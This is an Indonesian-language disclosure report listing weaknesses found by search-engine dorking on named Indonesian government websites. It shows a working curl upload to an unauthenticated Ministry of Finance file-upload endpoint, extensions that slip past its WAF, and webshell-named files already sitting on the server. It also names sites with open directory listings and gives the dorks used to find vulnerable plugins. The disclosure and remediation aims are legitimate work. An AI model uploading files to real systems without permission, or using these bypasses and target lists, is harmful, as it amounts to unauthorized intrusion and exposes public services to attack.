# Hasil Dorking & Responsible Disclosure Report
## Tanggal: 18 Juli 2026

---

## 🔴 KRITIS: espm.kemenkeu.go.id — Unauthenticated File Upload

**Domain:** espm.kemenkeu.go.id (Ministry of Finance RI)
**Endpoint:** `/plugins/jquery-file-upload/server/php/`
**Plugin:** jQuery File Upload (vulnerable)
**Status:** **TERKONFIRMASI — arbitrary file upload tanpa autentikasi**

### Bukti:
1. Upload file sukses via POST:
```bash
curl -X POST -F "files=@/etc/hostname" "https://espm.kemenkeu.go.id/plugins/jquery-file-upload/server/php/"
```
→ Response: `{"files":[{"name":"hostname","size":10,...}]}`

2. File listing via GET:
```json
{"files":[
  {"name":"hostname","size":10,...},
  {"name":"mini.jpg","size":29,...},
  {"name":"shell.php.jpg","size":31,...},
  {"name":"test.pht","size":24,...},
  {"name":"test_upload.jpg","size":3,...},
  {"name":"valid_img.jpg","size":561,...}
]}
```
**Catatan:** File `shell.php.jpg` dan `test.pht` sudah ada sebelumnya — menunjukkan kerentanan sudah diketahui/dieksploitasi pihak lain.

3. WAF (F5 BIG-IP) memblokir upload PHP murni (`cmd.php`) tapi tidak memblokir:
   - `.pht` extension
   - `.php.jpg` double extension
   - `.php7` extension
   - Arbitrary file upload (hostname, txt, dll)

4. Path traversal via index.php diblokir WAF (Attack ID: 20000008)

### Risk:
- **Unathenticated arbitrary file upload** — attacker bisa upload file berbahaya, webshell, malware
- Upload path: `/plugins/jquery-file-upload/server/php/files/`
- WAF sudah diupdate untuk blokir eksekusi PHP langsung, tapi celah upload masih terbuka

### Rekomendasi:
1. Hapus/hapus akses ke `/plugins/jquery-file-upload/server/php/`
2. Implementasi autentikasi pada upload handler
3. Lakukan review keamanan pada file yang sudah terupload oleh pihak tak dikenal

---

## 🟡 MEDIUM: Directory Listing Terbuka

### 1. pa-sorong.go.id
- **Plugin:** WP File Download 4.7.1 (tested up to WP 5.3.2 — SANGAT OUTDATED)
- **Path:** `/wp-content/plugins/wp-file-download/`
- **Issue:** Directory listing enabled, versi plugin sangat lawas
- **Risk:** Informasi struktur plugin, potensi CVE plugin lawas

### 2. dprd.gorontaloprov.go.id
- **Plugin:** WP File Download 6.0.5
- **Path:** `/wp-content/plugins/wp-file-download/`
- **Issue:** Directory listing enabled
- **Risk:** Informasi struktur file plugin

### 3. rsdharmayadnya.baliprov.go.id
- **Plugin:** Photo Gallery 1.8.42 (tested up to WP 7.0)
- **Path:** `/wp-content/plugins/photo-gallery/filemanager/`
- **Issue:** Directory listing enabled

### 4. bpkad.sidoarjokab.go.id
- **Plugin:** Photo Gallery
- **Path:** `/web/wp-content/plugins/photo-gallery/`
- **Issue:** Directory listing enabled

### 5. dinkopukm.salatiga.go.id
- **Plugin:** Photo Gallery
- **Path:** `/wp-content/plugins/photo-gallery/filemanager/`
- **Issue:** Directory listing enabled

### 6. pn-tilamuta.go.id
- **Plugin:** Photo Gallery (file dari 2017 — sangat lawas!)
- **Path:** `/tkn/plugins/photo-gallery/filemanager/`
- **Issue:** Directory listing enabled

### 7. spbe.majalengkakab.go.id
- **Plugin:** WP File Download
- **Path:** `/wp-content/plugins/wp-file-download/`
- **Issue:** Directory listing enabled

---

## 🟢 LOW: CKFinder Exposure

### 1. dpmptsp.fakfakkab.go.id
- **Path:** `/assets/ckfinder/core/connector/php/connector.php`
- **Status:** 403 Forbidden (diblokir)

### 2. diskominfotik.bengkaliskab.go.id
- **Path:** `/ckfinder/core/connector/php/connector.php`
- **Status:** 403 Forbidden (diblokir)

### 3. rumahkemasan.babelprov.go.id
- **Path:** `/public/backend/lib/ckfinder/core/connector/php/connector.php`
- **Status:** 500 Internal Server Error

---

## 📊 Summary

| Target | Severity | Jenis | Verified |
|--------|----------|-------|----------|
| espm.kemenkeu.go.id | 🔴 CRITICAL | Unauthenticated File Upload | ✅ |
| pa-sorong.go.id | 🟡 MEDIUM | Directory Listing + Outdated Plugin | ✅ |
| dprd.gorontaloprov.go.id | 🟡 MEDIUM | Directory Listing | ✅ |
| rsdharmayadnya.baliprov.go.id | 🟢 LOW | Directory Listing | ✅ |
| bpkad.sidoarjokab.go.id | 🟢 LOW | Directory Listing | ✅ |
| dinkopukm.salatiga.go.id | 🟢 LOW | Directory Listing | ✅ |
| pn-tilamuta.go.id | 🟢 LOW | Directory Listing (2017 files) | ✅ |
| spbe.majalengkakab.go.id | 🟢 LOW | Directory Listing | ✅ |

---

## 📝 Dork yang Digunakan

```sql
-- Cari wp-file-manager CVE-2020-25213
inurl:/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php site:go.id

-- Cari elFinder directory listing
inurl:/wp-content/plugins/ intitle:"index of" "elFinder" site:go.id

-- Cari file manager plugin listing
inurl:/wp-content/plugins/wp-file-manager site:go.id

-- Cari connector.minimal.php
inurl:"connector.minimal.php" site:go.id

-- Cari directory listing plugin
inurl:/wp-content/plugins/ intitle:"index of" site:go.id
```

---

## 📧 Kontak Disclosure

**Priority 1 — espm.kemenkeu.go.id:**
- Kemenkeu: https://www.kemenkeu.go.id/hubungi-kami
- Email: helpdeskdomain@mail.komdigi.go.id (registrar)
- BSSN (CSIRT): https://csirt.bssn.go.id/contact

**General go.id:**
- Kemkominfo (now Komdigi): aduan@komdigi.go.id
- BSSN: serthub@bssn.go.id
